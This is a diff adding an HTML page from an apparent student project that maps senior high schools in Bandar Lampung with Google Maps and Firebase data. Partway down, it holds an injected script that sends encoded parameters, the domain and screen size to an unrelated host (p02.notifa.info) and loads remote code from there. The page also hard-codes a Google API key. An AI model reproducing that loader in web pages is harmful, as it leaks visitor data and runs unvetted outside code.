@@ -1,0 +1,98 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>SI SEBARAN SMA/SEDERAJAT DI BANDAR LAMPUNG</title>
+    <link rel="stylesheet" type="text/css" href="desain.css"/>
+        <style>
+            #map {
+                background-color: gray;
+                width: 100%;
+                height: 400px;
+      }
+        </style>
+    </head>
+    <body>
+            <div class="header"> <h1><center> <img src= lambangbdl.png height= "60" width= "60">  SISTEM INFORMASI PERSEBARAN SMA/SEDERAJAT DI BANDAR LAMPUNG</center></h1></div>
+            <div class="navbar">
+            <a href="main.html">Home</a>
+            <div class="dropdown">
+                <button class="dropbtn">STATUS
+                <i class="fa fa-caret-down"></i>
+                </button>
+                <div class="dropdown-content">
+                        <a href='https://anitadmhrn.000webhostapp.com/20180426/proyek_sebaranSMA.html'>NEGERI</a>
+                        <a>SWASTA</a>
+                        </div>
+                
+            </div> 
+            <div class="dropdown">
+                <button class="dropbtn">AKREDITASI
+                <i class="fa fa-caret-down"></i>
+                </button>
+                <div class="dropdown-content">
+                        <a>A</a>
+                        <a>B</a>
+                        <a>C</a>
+                        </div> 
+            </div> 
+            </div>
+        
+        <script src="http://maps.googleapis.com/maps/api/js"></script>
+        <div style='text-align: right;position: fixed;z-index:9999999;bottom: 0; width: 100%;cursor: pointer;line-height: 0;display:block !important;'><a title="000webhost logo" rel="nofollow" target="_blank" href="https://www.000webhost.com/?utm_source=000webhostapp&amp;utm_campaign=000_logo&amp;utm_campaign=ss-footer_logo&amp;utm_medium=000_logo&amp;utm_content=website"><img src="https://cdn.rawgit.com/000webhost/logo/e9bd13f7/footer-powered-by-000webhost-white2.png" alt="000webhost logo"></a></div><script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5ma26dR9L7m8ojn3hnOJTYFDk7pZxJOBW7KEn20Qewkf0I3ISyfcaLwLPTXO6Km8AkIBQvCUwYMNb2K9VlSBwlKGHD2kdiVzJJwXDgrSEmuP%2f0vfSLVH%2b36apnbV3U7oPpL4Hj2jkTO5SdDF0XFiCjKMceEMzCc5%2fvBq7r%2fLbkHVGRWHr%2fiP%2fVd9qZccC7UveV4nDg3uja6nDJkRlGFbG3yJBAFMD4Bio1Zed%2f9CV9unYuVQpt%2fuhEfpus%2fL0XVILDm%2fKWlDPdrxHz6cT70dbp3KVpmz5rAeNo5XYfTMiP6oNvqc8MhQPZLKsDIxSbpJsXQ8LnEKXHm8Fbv7wT%2b8qx8LOJvHeulki9PTdBmZFsCXSvXunMh49HN6ejMuo7c1ZLiDKoegzE8AaugSGLITl%2fOSwVLsauGXF77Pq1qBXQPq8HkazUht7yDWHHOSHBOoNFNmTwVktDEcqFTzlmOiiSnPMn913%2buRQA%2b49MBTFbkh9oWj9ZgMskdlmmSIqW8CXGvt5DIBKhcPlY2LUL08N61uFAUeqr%2bP4bkgTwyHTb3dp7eowtCV4Lx0ZIyd8nkAsCeZs5W9xm75Tfm8K%2bMvCjtA%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+    
+        <div id= "map"></div>
+        <div class="footer"> <center> Copyright &copy; 2018. All rights reserved. Designed and developed by AnitaDM_1657051008 MayaAkhriza_1617051017 ZakiatunNufus_1617051046</center></div>
+        <script src="https://www.gstatic.com/firebasejs/5.0.2/firebase.js"></script>
+        <script async defer src="https://maps.googleapis.com/maps/api/js?key=AIzaSyATKrdaGQPHxiptfNJkjf-Wtw5g9jhMWX8&callback=initMap"></script>
+ 
+<script>
+    var map = null;
+    var center = {lat:-5.367284, lng:105.244935};
+    var infowindow;
+    var config = {
+        apiKey: "AIzaSyATKrdaGQPHxiptfNJkjf-Wtw5g9jhMWX8",
+            authDomain: "sebaran-sma.firebaseapp.com",
+            databaseURL: "https://sebaran-sma.firebaseio.com",
+            projectId: "sebaran-sma",
+            storageBucket: "sebaran-sma.appspot.com",
+            messagingSenderId: "676661598886"
+  };
+  firebase.initializeApp(config);
+
+    var db              = firebase.database();
+    var dataRef         = db.ref('bdl');
+
+    dataRef.on('value',showData, showError);
+    function showData(data){
+        //console.log(data.val());
+        map.data.addGeoJson(data.val());
+        map.data.setStyle({
+            fillColor:'yellow' , 
+            strokeWeight: 0.2
+        });
+        map.data.addListener('click', function(event){
+            infoWindowContent = event.feature.getProperty('DESA')+"<br>"+ event.feature.getProperty('KECAMATAN');
+            console.log(infoWindowContent);
+            infowindow.setContent(infoWindowContent);
+            infowindow.setPosition(event.latLng);
+            infowindow.open(map);
+        });
+    }
+    function showError(err){
+        console.log(err);                
+    }
+
+  function initMap(){
+      map= new google.maps.Map(document.getElementById('map'),{
+          zoom: 9,
+          center: center
+      });
+      infowindow = new google.maps.InfoWindow();
+  }
+</script>
+    </body>
+    </html> 
